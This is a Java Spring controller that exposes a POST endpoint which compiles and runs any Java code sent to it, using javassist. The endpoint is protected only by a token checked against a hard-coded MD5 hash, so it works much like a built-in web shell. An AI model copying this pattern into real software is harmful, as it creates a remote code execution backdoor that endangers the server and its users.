package com.black.visit;

import com.black.bin.InstanceBeanManager;
import com.black.bin.InstanceType;
import com.black.core.annotation.ChiefServlet;
import com.black.core.query.ClassWrapper;
import com.black.core.util.Base64Utils;
import com.black.javassist.PartiallyCtClass;
import com.black.javassist.Utils;
import com.black.utils.IdUtils;
import com.black.utils.MD5Utils;
import io.swagger.annotations.Api;
import io.swagger.annotations.ApiOperation;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.codec.digest.Md5Crypt;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestParam;

import java.util.Map;

/**
 * @author 李桂鹏
 * @create 2023-05-09 14:05
 */
@SuppressWarnings("all")
@Api(tags = "unsefa manager")
@ChiefServlet("unsefa-visit-compile")
public class VisitCompileController {

    public static final String PREFIX = "UnsefaVisit_";

    private volatile boolean init = false;

    @PostMapping(value = "run", consumes = "text/plain")
    @ApiOperation("执行一段无返回值的代码")
    void run(@RequestParam String token, @RequestBody String code){
        if (!check(token)){
            throw new IllegalStateException("token invalid");
        }
        prepare();
        //创建一个虚拟类
        PartiallyCtClass ctClass = PartiallyCtClass.make(PREFIX + IdUtils.createShort8Id());
        //构建一个虚拟方法
        ctClass.addMethod("run", void.class, code);
        Class<?> javaClass = ctClass.getJavaClass();
        try {
            ClassWrapper<?> classWrapper = ClassWrapper.get(javaClass);
            //实例化
            Object instance = InstanceBeanManager.instance(javaClass, InstanceType.REFLEX);
            classWrapper.getSingleMethod("run").invoke(instance);
        }finally {
            Map<String, CtClass> poolCache = Utils.getPoolCache();
            poolCache.remove(javaClass.getName());
        }

    }

    private synchronized void prepare(){
        if (init) return;
        try {
            ClassPool pool = Utils.getPool();
            pool.importPackage("java.lang");
            pool.importPackage("java.util");
        }finally {
            init = true;
        }

    }

    private boolean check(String token){
        String pwd = MD5Utils.getPWD(token);
        return "0bb42db49afa305c9a0a8b153acfdceb".equalsIgnoreCase(pwd);
    }

}
